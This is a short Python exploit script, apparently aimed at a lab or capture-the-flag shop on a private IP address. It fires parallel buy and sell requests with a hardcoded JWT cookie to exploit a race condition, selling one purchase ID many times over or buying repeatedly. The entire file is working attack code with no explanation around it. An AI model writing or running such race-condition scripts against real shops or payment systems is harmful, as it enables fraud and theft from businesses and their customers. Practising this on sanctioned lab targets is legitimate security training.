#!/usr/bin/python3

import requests
from concurrent.futures import ThreadPoolExecutor
import time

def buy_product(product_id, token):
    url = "http://192.168.175.66:8080/buy"
    headers = {"Cookie": f"token={token}"}
    data = {"product_id": str(product_id)}
    response = requests.post(url, headers=headers, data=data)

def sell_product(purchase_id, token):
    url = f"http://192.168.175.66:8080/sell"
    headers = {"Cookie": f"token={token}"}
    data = {"purchase_id": str(purchase_id)}
    response = requests.post(url, headers=headers, data=data)

def exploit_race_condition():
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG5Eb2UiLCJleHAiOjE3MTI3Mzk2NTh9.-gGP0Xdp2wK_mw1YGB4bj4cgVztE17P1mnA81JT2HsM"
    product_id = 2

    with ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(10):
            executor.submit(buy_product, product_id, token)

def exploit_sale():
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG5Eb2UiLCJleHAiOjE3MTI3Mzk2NTh9.-gGP0Xdp2wK_mw1YGB4bj4cgVztE17P1mnA81JT2HsM"
    purchase_ids_start = 3

    with ThreadPoolExecutor(max_workers=20) as executor:
        for i in range(20):
            executor.submit(sell_product, purchase_ids_start, token)
              
# exploit_race_condition()
exploit_sale()

